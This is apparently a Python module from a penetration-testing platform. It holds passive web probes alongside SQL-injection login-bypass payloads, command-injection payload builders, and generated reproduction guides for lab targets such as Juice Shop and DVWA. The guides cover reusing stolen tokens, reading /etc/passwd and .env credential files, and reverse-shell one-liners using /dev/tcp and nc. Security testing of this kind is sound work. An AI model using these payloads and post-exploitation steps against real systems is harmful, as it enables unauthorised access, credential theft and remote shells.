"""Real probe runners for operator-approved suggestions.

Phase 49 — each function here is an async generator that yields
StageEvent | ResultEvent records as it performs a real HTTP probe
against the canonical target. The runtime consumes the stream and
animates stage nodes / spawns result nodes carrying the real evidence.

Deterministic: no LLM, no heuristic scoring. Given the same target
response, the same events fire. Evidence dicts contain the actual
fetched values so an operator can verify each conclusion.

TODO(phase-54-probe-migration): every ResultEvent in this file
currently emits `label` + `kind` + `evidence: dict` (legacy shape).
The structured payload schema introduced in Phase 54 (see
probe/events.py docstring) is now available — migration is to
populate `payload={'request':…, 'response':…, 'sent':…,
'observed':…, 'analysis': {confirmed, severity, exploitability_notes,
references}}` and optionally `next_actions=(...,)` to override the
catalog defaults. Until each probe migrates, its evidence renders
through the legacy fallback (context_panel_runtime.html with a
'Legacy evidence' subtitle chip).

Migration sites in this file: probe_robots_check (3 ResultEvent),
probe_csp_check_meta (3 ResultEvent), probe_csp_inspect_origins
(3 ResultEvent) — 9 total. Migrate one at a time to keep PRs small.
"""
from __future__ import annotations

import asyncio
import re
from collections.abc import AsyncIterator
from urllib.parse import urljoin, urlparse

import httpx

from apps.investigation_workspace.probe.events import ResultEvent, StageEvent

_DEFAULT_TIMEOUT = 6.0


def _client() -> httpx.AsyncClient:
    """Configured httpx client — short timeout, follows redirects, lax TLS."""
    return httpx.AsyncClient(
        timeout         = _DEFAULT_TIMEOUT,
        follow_redirects = True,
        verify           = False,
    )


# ── Shared API auth ──────────────────────────────────────────────────────────
# Auth state is owned by SessionOrchestrator (investigation-scoped). Operator refreshes via /admin/session-auth/refresh.


def _get_session_orch():
    """Return the investigation-scoped SessionOrchestrator for this probe invocation.

    In production flow, INVESTIGATION_ID_CTX is set by _runner_from_probe before
    the probe is called — returns that investigation's session_orch.

    In tests / direct invocation (no investigation context), returns an ephemeral
    SessionOrchestrator. Writes to it are silently discarded; reads return None.
    """
    from apps.investigation_workspace.execution.runtime import INVESTIGATION_ID_CTX
    from apps.conductor.shared import get_shared_conductor
    investigation_id = INVESTIGATION_ID_CTX.get()
    if investigation_id:
        ctx = get_shared_conductor().get_context(investigation_id)
        if ctx is not None:
            return ctx.session_orch
    from apps.conductor.orchestrators.session import SessionOrchestrator
    return SessionOrchestrator()


# ── 1. svc_robots_check ─────────────────────────────────────────────────


async def probe_robots_check(target: str) -> AsyncIterator[StageEvent | ResultEvent]:
    """Fetch /robots.txt and /sitemap.xml; surface real paths/disclosures.

    What's exposed:
      • robots.txt content (Disallow / Allow / Sitemap entries)
      • sitemap.xml entry count
      • paths the target itself reveals it doesn't want crawled
    """
    base = target.rstrip("/")

    # ── robots.txt ─────────────────────────────────────────────────────
    yield StageEvent(
        label    = "Fetching /robots.txt",
        actions  = (f"GET {base}/robots.txt",),
        tools    = ("httpx async client",),
        confidence = "—",
    )

    robots_url = urljoin(base + "/", "robots.txt")
    robots_body = ""
    robots_status: int | None = None
    try:
        async with _client() as c:
            r = await c.get(robots_url)
            robots_status = r.status_code
            if r.status_code < 400:
                robots_body = r.text
    except httpx.RequestError as e:
        yield ResultEvent(
            label    = f"/robots.txt fetch failed: {e!s}",
            kind     = "note",
            evidence = {"url": robots_url, "error": str(e)},
        )

    if robots_status is not None and robots_status >= 400:
        yield ResultEvent(
            label    = f"/robots.txt returned HTTP {robots_status} (not present)",
            kind     = "note",
            evidence = {"url": robots_url, "status_code": robots_status},
        )
    elif robots_body:
        disallowed: list[str] = []
        sitemaps:   list[str] = []
        for line in robots_body.splitlines():
            s = line.strip()
            if not s or s.startswith("#"):
                continue
            low = s.lower()
            if low.startswith("disallow:"):
                disallowed.append(s.split(":", 1)[1].strip())
            elif low.startswith("sitemap:"):
                sitemaps.append(s.split(":", 1)[1].strip())
        label_bits: list[str] = []
        if disallowed:
            label_bits.append(f"{len(disallowed)} Disallow")
        if sitemaps:
            label_bits.append(f"{len(sitemaps)} Sitemap")
        if not label_bits:
            label_bits.append("present but empty / informational only")
        yield ResultEvent(
            label    = f"/robots.txt: {', '.join(label_bits)}",
            kind     = "detected",
            evidence = {
                "url":         robots_url,
                "status_code": robots_status,
                "disallowed":  disallowed[:50],
                "sitemaps":    sitemaps,
                "body_excerpt": robots_body[:600],
            },
        )

    # ── sitemap.xml ────────────────────────────────────────────────────
    yield StageEvent(
        label    = "Fetching /sitemap.xml",
        actions  = (f"GET {base}/sitemap.xml",),
        tools    = ("httpx async client",),
        confidence = "—",
    )

    sitemap_url = urljoin(base + "/", "sitemap.xml")
    sitemap_status: int | None = None
    sitemap_locs: list[str] = []
    try:
        async with _client() as c:
            r = await c.get(sitemap_url)
            sitemap_status = r.status_code
            if r.status_code < 400:
                # Cheap regex parse — avoids pulling in an XML dep just for
                # extracting <loc>. Works on real-world sitemaps; if a target
                # serves something exotic the count just reads as 0.
                sitemap_locs = re.findall(r"<loc>([^<]+)</loc>", r.text)[:200]
    except httpx.RequestError as e:
        yield ResultEvent(
            label    = f"/sitemap.xml fetch failed: {e!s}",
            kind     = "note",
            evidence = {"url": sitemap_url, "error": str(e)},
        )

    if sitemap_status is None:
        pass  # already yielded fetch failure
    elif sitemap_status >= 400:
        yield ResultEvent(
            label    = f"/sitemap.xml returned HTTP {sitemap_status} (not present)",
            kind     = "note",
            evidence = {"url": sitemap_url, "status_code": sitemap_status},
        )
    else:
        yield ResultEvent(
            label    = f"/sitemap.xml lists {len(sitemap_locs)} URL"
                       f"{'' if len(sitemap_locs) == 1 else 's'}",
            kind     = "detected" if sitemap_locs else "note",
            evidence = {
                "url":         sitemap_url,
                "status_code": sitemap_status,
                "loc_count":   len(sitemap_locs),
                "first_20":    sitemap_locs[:20],
            },
        )


# ── 2. csp_check_meta ───────────────────────────────────────────────────


_META_CSP_RE = re.compile(
    r'<meta[^>]+http-equiv\s*=\s*[\'"]Content-Security-Policy[\'"][^>]*>',
    re.IGNORECASE,
)
_META_CSP_CONTENT_RE = re.compile(
    r'content\s*=\s*[\'"]([^\'"]*)[\'"]',
    re.IGNORECASE,
)


async def probe_csp_check_meta(target: str) -> AsyncIterator[StageEvent | ResultEvent]:
    """Fetch the page, look for a <meta http-equiv="Content-Security-Policy">.

    Confirms whether a meta-equivalent CSP exists to compensate for the
    missing header — a real second look before declaring the gap final.
    """
    yield StageEvent(
        label    = "Fetching page HTML",
        actions  = (f"GET {target}",),
        tools    = ("httpx async client",),
        confidence = "—",
    )

    body = ""
    try:
        async with _client() as c:
            r = await c.get(target)
            body = r.text if r.headers.get("content-type", "").startswith("text/") else ""
            status = r.status_code
    except httpx.RequestError as e:
        yield ResultEvent(
            label    = f"Page fetch failed: {e!s}",
            kind     = "note",
            evidence = {"url": target, "error": str(e)},
        )
        return

    yield StageEvent(
        label    = "Searching for meta-equivalent CSP",
        actions  = ('Scanning <meta http-equiv="Content-Security-Policy">',),
        tools    = ("regex html scanner",),
        detected = (f"HTML body: {len(body)} bytes",),
        confidence = "high",
    )

    match = _META_CSP_RE.search(body)
    if not match:
        yield ResultEvent(
            label    = "No meta-equivalent CSP tag found",
            kind     = "persists",
            evidence = {
                "url":         target,
                "status_code": status,
                "body_bytes":  len(body),
                "search":      'meta[http-equiv="Content-Security-Policy"]',
            },
        )
        return

    tag = match.group(0)
    content_m = _META_CSP_CONTENT_RE.search(tag)
    content_value = content_m.group(1) if content_m else ""
    yield ResultEvent(
        label    = f"meta CSP found: {content_value[:80] or '(no content attribute)'}",
        kind     = "detected",
        evidence = {
            "url":            target,
            "status_code":    status,
            "matched_tag":    tag[:300],
            "content_value":  content_value,
        },
    )


# ── 3. csp_inspect_origins ──────────────────────────────────────────────


_SCRIPT_SRC_RE = re.compile(
    r'<script[^>]+src\s*=\s*[\'"]([^\'"]+)[\'"]',
    re.IGNORECASE,
)


async def probe_csp_inspect_origins(
    target: str,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Fetch the page, parse <script src=...>, classify by origin.

    Builds the cross-origin script picture the missing CSP would have
    constrained. Real evidence: actual src URLs from the live HTML.
    """
    yield StageEvent(
        label    = "Fetching page HTML",
        actions  = (f"GET {target}",),
        tools    = ("httpx async client",),
        confidence = "—",
    )

    body = ""
    try:
        async with _client() as c:
            r = await c.get(target)
            body = r.text if r.headers.get("content-type", "").startswith("text/") else ""
            status = r.status_code
    except httpx.RequestError as e:
        yield ResultEvent(
            label    = f"Page fetch failed: {e!s}",
            kind     = "note",
            evidence = {"url": target, "error": str(e)},
        )
        return

    srcs = _SCRIPT_SRC_RE.findall(body)
    yield StageEvent(
        label    = "Enumerating <script src> origins",
        actions  = (f"Found {len(srcs)} <script src> entries",),
        tools    = ("regex html scanner",),
        detected = (f"HTML body: {len(body)} bytes", f"<script src> hits: {len(srcs)}"),
        confidence = "high",
    )

    target_host = (urlparse(target).hostname or "").lower()
    first_party: list[str] = []
    third_party: dict[str, list[str]] = {}
    inline_only_signal = len(srcs) == 0
    for src in srcs:
        host = (urlparse(src).hostname or "").lower()
        if not host or host == target_host:
            first_party.append(src)
        else:
            third_party.setdefault(host, []).append(src)

    yield StageEvent(
        label    = "Classifying origins",
        actions  = (
            f"{len(first_party)} first-party / {sum(len(v) for v in third_party.values())} "
            f"third-party / {len(third_party)} distinct cross-origin host"
            f"{'' if len(third_party) == 1 else 's'}",
        ),
        tools    = ("urlparse",),
        detected = tuple(f"third-party: {h}" for h in list(third_party)[:5]) or
                   (("no third-party scripts",) if not inline_only_signal
                    else ("inline-only — no <script src>",)),
        confidence = "high",
    )

    if not third_party:
        yield ResultEvent(
            label    = "No third-party script sources",
            kind     = "blocked",
            evidence = {
                "url":          target,
                "status_code":  status,
                "first_party":  first_party[:30],
            },
        )
        return

    yield ResultEvent(
        label    = f"{len(third_party)} third-party script host"
                   f"{'' if len(third_party) == 1 else 's'}: "
                   + ", ".join(list(third_party)[:3])
                   + ("…" if len(third_party) > 3 else ""),
        kind     = "detected",
        evidence = {
            "url":              target,
            "status_code":      status,
            "first_party":      first_party[:20],
            "third_party_hosts": list(third_party),
            "third_party_examples": {h: v[:3] for h, v in list(third_party.items())[:8]},
        },
    )



# ── 5. sqli_auth_bypass ─────────────────────────────────────────────────
# Phase 58 — real SQL-injection auth-bypass probe. Tries a small set of
# canonical bypass payloads against common login endpoints. On success,
# captures session state and hands off to apps/investigation_workspace
# /capture/bundler.py for a post-exploit artifact bundle.

# Phase 58 — the canonical login-endpoint path list lives in the
# recon probe module; both probes import the same tuple so they
# stay in sync. Local (not top-of-file) so the constant sits next
# to the SQLi section it belongs to.
from apps.investigation_workspace.probe.sqli_recon import (  # noqa: E402
    LOGIN_ENDPOINT_PATHS as _SQLI_LOGIN_ENDPOINTS,
)

# Canonical auth-bypass payloads. Don't expand the set here — operators
# can request more variants in a follow-up PR.
_SQLI_PAYLOADS: tuple[dict, ...] = (
    {"email": "' OR 1=1--",                "password": "anything"},
    {"email": "admin@example.com' OR '1'='1", "password": "x"},
    {"email": "admin'--",                  "password": "x"},
    {"email": "' OR 1=1#",                 "password": "x"},
)

_SQLI_REFERENCES = (
    {"label": "CWE-89 — Improper Neutralization of Special Elements used in an SQL Command",
     "url":   "https://cwe.mitre.org/data/definitions/89.html"},
    {"label": "OWASP — SQL Injection",
     "url":   "https://owasp.org/www-community/attacks/SQL_Injection"},
    {"label": "PortSwigger — SQL injection",
     "url":   "https://portswigger.net/web-security/sql-injection"},
)

# Field names that indicate an authentication token in the response body.
_TOKEN_FIELDS = ("authentication", "token", "access_token", "jwt", "session")

# Post-exploit endpoints to capture on Juice Shop. On other targets these
# will mostly 404 — the bundler records that explicitly so the operator
# can see the probe attempted them.
_JUICE_SHOP_POST_EXPLOIT_ENDPOINTS = (
    "/rest/user/whoami",
    "/api/Users",
    "/rest/basket",
    "/api/BasketItems",
)


def _sqli_extract_token(body_text: str) -> tuple[str, dict] | tuple[None, None]:
    """If the response body contains an auth token field, return
    (token_string, parsed_body_dict). Else (None, None)."""
    try:
        import json
        parsed = json.loads(body_text)
    except Exception:
        return None, None
    if not isinstance(parsed, dict):
        return None, None

    def _walk(obj):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if k.lower() in _TOKEN_FIELDS and isinstance(v, str) and v:
                    return v
                if k.lower() in _TOKEN_FIELDS and isinstance(v, dict):
                    # e.g. Juice Shop: {"authentication": {"token": "..."}}
                    for kk, vv in v.items():
                        if kk.lower() in ("token", "access_token", "jwt") and isinstance(vv, str):
                            return vv
                if isinstance(v, (dict, list)):
                    nested = _walk(v)
                    if nested:
                        return nested
        elif isinstance(obj, list):
            for item in obj:
                nested = _walk(item)
                if nested:
                    return nested
        return None

    return _walk(parsed), parsed


async def _sqli_find_login_endpoints(client: httpx.AsyncClient, base: str) -> list[str]:
    """Return the subset of _SQLI_LOGIN_ENDPOINTS that exist on the target
    (probe with OPTIONS or a HEAD; consider 200/204/400/401/405 as 'exists').
    """
    found: list[str] = []
    for ep in _SQLI_LOGIN_ENDPOINTS:
        url = base + ep
        try:
            r = await client.request("OPTIONS", url)
            if r.status_code < 500 and r.status_code != 404:
                found.append(ep)
        except httpx.RequestError:
            continue
    return found


def _sqli_severity(token_captured: bool, redirect_only: bool, bypass_observed: bool) -> str:
    """Per Phase 58 calibration table:
       - token captured        → critical
       - bypass via 302 only   → high
       - no bypass             → info
    """
    if not bypass_observed:
        return "info"
    if token_captured:
        return "critical"
    return "high"


def _build_sqli_reproduction_markdown(
    *,
    target_base_url:     str,
    login_url:           str,
    bypass_payload:      dict,
    token:               str | None,
    cookies:             dict,
    discovered_email:    str | None,
    captured_endpoints:  list[str],
) -> str:
    """Phase 57c — operator-facing reproduction guide for the SQLi
    auth bypass. Specific to THIS exploit (not generic boilerplate)
    so the operator sees the actual captured email + token slice.

    SQLi-specific. When a second probe needs its own reproduction
    artifact, refactor with two concrete cases informing the
    abstraction — not before.
    """
    import json
    email_str  = discovered_email or "(no umail field in response — check api_Users_response.json)"
    token_show = (token[:30] + "…") if token else "(no token captured — see exploit_response.txt)"
    payload_json = json.dumps(bypass_payload)

    # Section 2 listing — generated dynamically from the endpoints the
    # probe captured. Bundle is built BY the bundler; we know in
    # advance which artifacts will exist (3 standard + 1 per endpoint).
    from apps.investigation_workspace.capture.bundler import (
        _filename_from_endpoint,
    )
    artifact_lines: list[str] = [
        "- `exploit_request.txt` — the SQLi payload that succeeded.",
        "- `exploit_response.txt` — server's full response (contains "
        "the session token and `umail` field).",
        "- `session.txt` — captured cookies and the Authorization "
        "header carrying the JWT.",
    ]
    for ep in captured_endpoints:
        artifact_lines.append(
            f"- `{_filename_from_endpoint(ep)}` — authenticated GET "
            f"of `{ep}` using the bypassed session."
        )

    # Option 2 — Juice-Shop-specific localStorage step. When a future
    # target uses different storage, this block needs target-awareness.
    # For now the comment documents the assumption.
    juice_shop_storage_note = (
        "  Juice Shop reads the JWT from `localStorage.token`. Other "
        "targets may store the session differently (cookies, "
        "sessionStorage); inspect the app's network requests to find "
        "where the auth state lives."
    )

    # The SQLi payload contains `'`, which would break the outer
    # single-quoted shell string. shlex.quote handles that safely.
    import shlex
    safe_payload = shlex.quote(payload_json)
    curl_example = (
        f"curl -i -X POST {login_url} \\\n"
        f"  -H 'Content-Type: application/json' \\\n"
        f"  -d {safe_payload}"
    )

    return f"""# SQL Injection — Authentication Bypass

The login endpoint at `{login_url}` accepts a SQL-injection payload \
in the `email` field. Submitting `{bypass_payload['email']!r}` causes \
the backing query's `WHERE` clause to evaluate true unconditionally, \
returning the first matching user row. On this target that row \
belongs to **{email_str}** — the bypass authenticated AS that user \
and the captured JWT carries their privileges.

## What was captured

{chr(10).join(artifact_lines)}

## How to use this bypass

### Option 1 — Use the JWT directly

The captured JWT is in `session.txt` (as the `Authorization` \
header) and inline at the start of `exploit_response.txt`. Send it \
as a Bearer token on any subsequent request:

```
Authorization: Bearer {token_show}
```

Example with curl:

```
curl -H 'Authorization: Bearer <paste full token from session.txt>' \\
  {target_base_url}/rest/user/whoami
```

### Option 2 — Inject into the browser

1. Open the target site in a browser: `{target_base_url}`
2. Open DevTools (F12) → Console.
3. Paste:
   ```
   localStorage.setItem('token', '<paste full token from session.txt>')
   ```
4. Reload the page. The application now treats you as **{email_str}**.

{juice_shop_storage_note}

### Option 3 — Reproduce from scratch

Run the exact request that succeeded:

```
{curl_example}
```

The response body contains the JWT under `authentication.token`. \
Use it via Option 1 or Option 2 above.

## What this exploit does NOT recover

- **The admin's password is not recovered.** Passwords are stored \
as one-way hashes (bcrypt/scrypt/argon2 depending on the backend); \
SQL injection here works *around* the password check, not against \
the hash. You cannot crack or extract the cleartext password from \
this bundle.
- **You cannot log in via the normal login form** with email + \
password because of the above. Authentication going forward uses \
the captured token (Options 1/2) or a fresh re-run of the bypass \
(Option 3).
- **Other accounts exist that this specific bypass did not reveal.** \
The injected `WHERE 1=1` returns the *first* user that matches \
(typically the lowest `user_id`, often the admin). Enumerate \
others via `api_Users_response.json` in this bundle, or try \
variant payloads (e.g. `' OR id=2--`).

## Vulnerability root cause

The login endpoint constructs its SQL query via raw string \
interpolation (or equivalent) of the `email` parameter rather than \
a parameterised/prepared statement. Standard fix: bind parameters, \
never concatenate user input into SQL. Tracked in MITRE as \
**[CWE-89](https://cwe.mitre.org/data/definitions/89.html) — \
Improper Neutralization of Special Elements used in an SQL \
Command**. Cookies captured during the bypass were: \
`{', '.join(cookies) or '(none)'}`.
"""


# probe_sqli_auth_bypass retired in V2.2 Step 7 — replaced by SqliAuthBypassEngine.

# ── 6. Command injection — three exploitation variants ────────────────
# Phase 60. Three genuinely-distinct techniques, NOT three modes of the
# same probe:
#
#   cmdi_reflected      — payload causes command output to appear in
#                         the response body. Detection: a unique marker
#                         echoes back. Captures whoami/id output to a
#                         post-exploit bundle.
#   cmdi_blind_time     — payload causes the response to delay. No
#                         output reaches the operator. Detection:
#                         response time >> baseline. No bundle.
#   cmdi_blind_boolean  — paired true/false payloads produce different
#                         responses (length, status, reflection).
#                         Detection: differential. No bundle.
#
# Shared infrastructure:
#   • COMMON_CMDI_PATHS from probe/cmdi_recon (single source of truth)
#   • FINDING_EVIDENCE_CTX for operator-provided auth state and
#     recon-emitted path hints
#
# authenticate_dvwa() fallback removed V2.2 Step 11 — lab_auth.py cleanup.
# All three cmdi probes retired in Steps 4–6; _cmdi_get_auth_state has no callers.

from apps.investigation_workspace.probe.cmdi_recon import (  # noqa: E402
    COMMON_CMDI_PATHS as _CMDI_PATHS,
)

# Per-payload-variant separators. The reflected probe iterates all
# variants and stops on the first that produces a reflected marker;
# the blind probes use the same separator catalog with `sleep` /
# boolean tests substituted for the marker echo.
_CMDI_SEPARATORS = (
    ";",       # POSIX command separator
    "|",       # pipe
    "&&",      # logical AND (preceding success required)
    "`{cmd}`", # backtick command substitution — special: full template
    "$({cmd})",# $() command substitution — special: full template
)

_CMDI_REFERENCES = (
    {"label": "CWE-77 — Improper Neutralization of Special Elements used in a Command",
     "url":   "https://cwe.mitre.org/data/definitions/77.html"},
    {"label": "CWE-78 — OS Command Injection",
     "url":   "https://cwe.mitre.org/data/definitions/78.html"},
    {"label": "OWASP — Command Injection",
     "url":   "https://owasp.org/www-community/attacks/Command_Injection"},
    {"label": "PortSwigger — OS command injection",
     "url":   "https://portswigger.net/web-security/os-command-injection"},
)


def _cmdi_recon_hints() -> dict:
    """Read recon hints from FINDING_EVIDENCE_CTX (set by the runtime
    when invoking the probe). Returns {} when the probe is invoked
    directly (tests, back-door route hits)."""
    from apps.investigation_workspace.execution.runtime import (
        FINDING_EVIDENCE_CTX,
    )
    return FINDING_EVIDENCE_CTX.get() or {}


def _cmdi_candidate_targets(target: str, hints: dict) -> list[dict]:
    """Resolve the (path, param_name) pairs the exploit probe will hit.

    Prefers paths discovered by the recon probe; falls back to the
    full COMMON_CMDI_PATHS list. The DVWA exec form's `ip` is the
    common default parameter name; if no specific name was recon'd,
    we use it as the fallback.
    """
    detected = hints.get("detected_paths") or list(_CMDI_PATHS)
    inputs   = hints.get("form_parameter_names") or ["ip"]
    # Build per-path target descriptors. Prefer the recon's
    # observations (which know the form's actual parameter names).
    observations = hints.get("observations") or []
    by_path = {o["path"]: o for o in observations}

    descriptors = []
    for path in detected:
        obs = by_path.get(path, {})
        raw_form = obs.get("form_inputs", [])
        # form_inputs is list[{name, type}]; filter out submit/button inputs and CSRF token
        form_inputs = [
            inp["name"] for inp in raw_form
            if isinstance(inp, dict)
            and inp.get("type", "text") not in ("submit", "button")
            and inp.get("name") not in ("user_token",)
        ]
        if not form_inputs:
            form_inputs = inputs
        for input_name in form_inputs:
            descriptors.append({
                "path":       path,
                "param_name": input_name,
                "form_action": obs.get("form_action", ""),
                "needs_csrf": any(
                    inp.get("name") == "user_token"
                    for inp in raw_form
                    if isinstance(inp, dict)
                ),
            })
    return descriptors


def _cmdi_build_reflected_payloads(marker: str) -> list[tuple[str, str]]:
    """Return [(separator_label, payload), …] — the seven payload
    forms the reflected variant will try in order. The label is for
    operator-facing diagnostics; the payload is what's sent.
    """
    payloads = []
    for sep in _CMDI_SEPARATORS:
        if "{cmd}" in sep:
            # Substitution form — wrap the marker echo
            payloads.append((sep, sep.format(cmd=f"echo {marker}")))
        else:
            payloads.append((sep, f"{sep} echo {marker}"))
    # The "; echo {MARKER} #" / "| echo {MARKER} #" variants help
    # against shells where a trailing comment is needed to swallow
    # the rest of the original command.
    payloads.append(("; (commented)", f"; echo {marker} #"))
    payloads.append(("| (commented)", f"| echo {marker} #"))
    return payloads


def _cmdi_build_time_payloads(seconds: int = 5) -> list[tuple[str, str]]:
    """Return [(separator_label, sleep_payload), …]."""
    payloads = []
    for sep in _CMDI_SEPARATORS:
        if "{cmd}" in sep:
            payloads.append((sep, sep.format(cmd=f"sleep {seconds}")))
        else:
            payloads.append((sep, f"{sep} sleep {seconds}"))
    return payloads


def _cmdi_build_boolean_pair(
    sep: str, reflection_supported: bool,
) -> tuple[str, str]:
    """Return (true_payload, false_payload) for the boolean blind
    variant. Two strategies:
      • reflection_supported (echoes work) → use shell-test bracket
        that emits "OK" on true and nothing on false.
      • otherwise → degenerate to sleep-presence (sleep 0 vs sleep 5).
    """
    if reflection_supported:
        if "{cmd}" in sep:
            t = sep.format(cmd="[ 1 -eq 1 ] && echo OK")
            f = sep.format(cmd="[ 1 -eq 2 ] && echo OK")
        else:
            t = f"{sep} [ 1 -eq 1 ] && echo OK"
            f = f"{sep} [ 1 -eq 2 ] && echo OK"
    else:
        # Sleep-based differential
        if "{cmd}" in sep:
            t = sep.format(cmd="sleep 0")
            f = sep.format(cmd="sleep 5")
        else:
            t = f"{sep} sleep 0"
            f = f"{sep} sleep 5"
    return t, f


def _cmdi_extract_pre_block(html: str) -> str:
    """DVWA renders exec output inside <pre>…</pre>. Pull the first
    such block for evidence."""
    m = re.search(r"<pre>(.*?)</pre>", html, re.S)
    return m.group(1).strip() if m else ""


async def _cmdi_submit_payload(
    client: httpx.AsyncClient,
    url: str,
    param_name: str,
    payload: str,
    needs_csrf: bool,
) -> httpx.Response | None:
    """POST the payload to the cmdi endpoint. For DVWA, refresh the
    user_token from the form before each submission."""
    data = {param_name: payload, "Submit": "Submit"}
    if needs_csrf:
        try:
            r = await client.get(url)
            m = re.search(
                r"name=['\"]user_token['\"][^>]*value=['\"]([0-9a-f]+)['\"]",
                r.text,
            )
            if m:
                data["user_token"] = m.group(1)
        except httpx.RequestError:
            return None
    try:
        return await client.post(url, data=data)
    except httpx.RequestError:
        return None


def _cmdi_reproduction_markdown(
    *,
    target_base_url:    str,
    full_url:           str,
    param_name:         str,
    successful_payload: str,
    successful_sep:     str,
    whoami_output:      str | None,
    id_output:          str | None,
    captured_endpoints: list[str],
) -> str:
    """Operator reproduction guide for a confirmed reflected cmdi.
    Mirrors the SQLi reproduction generator's shape."""
    artifact_lines = [
        "- `exploit_request.txt` — the payload-bearing request.",
        "- `exploit_response.txt` — full response containing the echoed marker and command output.",
        "- `session.txt` — auth cookies used for the request.",
        "- `whoami_output.txt` — parsed-out `whoami` result.",
        "- `id_output.txt` — parsed-out `id` result (if captured).",
        "- `detected_separator.txt` — which payload syntax worked (informs other commands).",
    ]
    for ep in captured_endpoints:
        artifact_lines.append(
            f"- `{ep.strip('/').replace('/', '_')}_response.json` — "
            f"additional follow-up captured from `{ep}`."
        )

    user_str = whoami_output.strip() if whoami_output else "(not captured)"
    id_str   = id_output.strip() if id_output else "(not captured)"

    # Build a runnable curl for the exact working request
    import shlex
    safe_payload = shlex.quote(successful_payload)
    curl_example = (
        f"curl -i -X POST {full_url} \\\n"
        f"  -H 'Cookie: <paste from session.txt>' \\\n"
        f"  --data-urlencode {param_name}={safe_payload} \\\n"
        f"  --data 'Submit=Submit'"
    )

    return f"""# Command Injection — Reflected, Confirmed

The endpoint at `{full_url}` interprets user input as a shell \
command. The `{param_name}` parameter, when supplied a payload \
beginning with the `{successful_sep}` separator, executes \
arbitrary commands on the target host as user **{user_str}**.

## What was captured

{chr(10).join(artifact_lines)}

## What this exploit demonstrates

- **OS-level code execution as the web user.** Any command the \
operator wants to run can be passed through the `{param_name}` \
parameter using the `{successful_sep}` separator.
- The captured shell user is **{user_str}** (output of `whoami`). \
The shell's `id` output is **{id_str}**.
- The command runs in the web server process's context, with \
whatever privileges that process holds.

## How to use this exploit

### Option 1 — Run another command via curl

```
{curl_example}
```

Replace the `{successful_payload}` payload with any other shell \
syntax — e.g. `{successful_sep} ls -la /etc`, \
`{successful_sep} cat /etc/passwd`. The shell evaluates whatever \
follows the separator.

### Option 2 — Establish a reverse shell

A reverse shell would let the operator interact with the target \
shell over a TCP socket rather than one curl per command. Common \
techniques to research:

- `bash -i >& /dev/tcp/<your-host>/<port> 0>&1`
- `nc -e /bin/sh <your-host> <port>` (where nc supports -e)
- Python / Perl one-liners that open a socket

This guide deliberately does NOT provide a copy-paste reverse \
shell payload. The operator must construct one matching the \
target's shell environment, available binaries, and listener \
infrastructure. See the PortSwigger reference below for current \
techniques.

### Option 3 — Pivot to data extraction

Once you have command execution, common high-value targets:

- `cat /etc/passwd` — enumerate local users (rarely useful by itself \
  but confirms file-read primitive).
- Application config files: `cat /var/www/html/config/*.php`, \
  `find / -name '.env' 2>/dev/null`, web-app-specific paths.
- Database credentials embedded in config: search the application \
  root for `mysql`, `postgres`, `password`, `secret` strings.

## What this exploit does NOT recover

- **Root access is not automatic.** The shell runs as the web \
process user ({user_str}). Privilege escalation is a separate \
exploitation problem.
- **Source code is not retrieved automatically.** You have a file-read \
primitive via `cat`; choosing what to read is the operator's job.
- **Database credentials are not extracted automatically.** \
Command execution gives you the ability to read config files \
where credentials may be stored, but locating and reading those \
files is a separate step.
- **Persistence is not established.** The session bound to this \
exploit lasts as long as the captured cookies remain valid.

## Vulnerability root cause

The endpoint passes user input directly to a shell command \
interpreter (likely `system()`, `exec()`, `shell_exec()`, or \
backticks in PHP) without sanitisation or argument-array \
separation. Standard fix: never pass user input to a shell; use \
`exec()` with the args-as-array form, validate inputs against an \
allowlist, or use language-level APIs that don't invoke a shell. \
Tracked in MITRE as **[CWE-77](https://cwe.mitre.org/data/definitions/77.html)** \
and **[CWE-78](https://cwe.mitre.org/data/definitions/78.html)**.

The working separator was `{successful_sep}` — useful when \
constructing further payloads since it tells you the shell \
evaluation context.
"""


# probe_cmdi_reflected retired in V2.2 Step 4 — replaced by CmdiReflectedEngine.

# probe_cmdi_blind_time retired in V2.2 Step 5 — replaced by CmdiBlindTimeEngine.

# probe_cmdi_blind_boolean retired in V2.2 Step 6 — replaced by CmdiBlindBooleanEngine.

# probe_brute_force_login retired in V2.2 Step 3 — replaced by CredentialBruteEngine.

# probe_api_exploit retired in V2.2 Step 11 — replaced by AccessControlEngine.

# probe_api_idor_mutate retired in V2.2 Step 11 consolidated cleanup — mutating IDOR deferred to operator-driven Burp/curl.

import json as _json  # noqa: E402


# ── API endpoint discovery probes (no-doc-required) ─────────────────────────


_COMMON_FALLBACK_ENDPOINTS: tuple[str, ...] = (
    "/api/users",
    "/api/user",
    "/api/products",
    "/api/orders",
)


# probe_api_default_creds_auth retired in V2.2 Step 9 — replaced by DefaultCredsEngine.

async def probe_api_authed_recon(
    target: str,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Standalone probe C — scrape authenticated pages for hidden API paths.

    Reads cached auth state from SessionOrchestrator. Falls back to empty
    cookies if no auth has been established yet, so public pages are
    still scraped.
    """
    from apps.investigation_workspace.probe.api_authed_recon import run_authed_recon

    parsed = urlparse(target if "://" in target else f"http://{target}")
    base = f"{parsed.scheme}://{parsed.netloc}"

    cached = _get_session_orch().get_target_auth(base)
    session_cookies: dict = {}
    if cached:
        session_cookies = cached.get("session_cookies") or {}
        yield StageEvent(
            label="Using cached authentication for authed-page recon",
            actions=(f"logged in as {cached.get('username', '?')} (cached)",),
            tools=(),
            detected=(f"session cookies: {list(session_cookies.keys())}",),
            confidence="high",
        )
    else:
        yield StageEvent(
            label="No cached auth — authed-page recon will use empty cookies",
            actions=("run 'Authenticate with default credentials' first for better coverage",),
            tools=(),
            confidence="low",
        )

    async for event in run_authed_recon(target, session_cookies):
        yield event


async def probe_api_endpoint_enum(
    target: str,
) -> AsyncIterator[StageEvent | ResultEvent]:
    """Standalone probe A — enumerate hidden API endpoints via wordlist.

    Reads cached auth from SessionOrchestrator.
    Checks FINDING_EVIDENCE_CTX for previously discovered paths and IDs from a
    prior authed-recon run.  Falls back to an unaided wordlist scan.
    """
    from apps.investigation_workspace.execution.runtime import FINDING_EVIDENCE_CTX
    from apps.investigation_workspace.probe.api_endpoint_enum import run_endpoint_enum

    parsed = urlparse(target if "://" in target else f"http://{target}")
    base = f"{parsed.scheme}://{parsed.netloc}"

    cached = _get_session_orch().get_target_auth(base)
    session_cookies: dict = (cached.get("session_cookies") or {}) if cached else {}

    ctx = FINDING_EVIDENCE_CTX.get() or {}
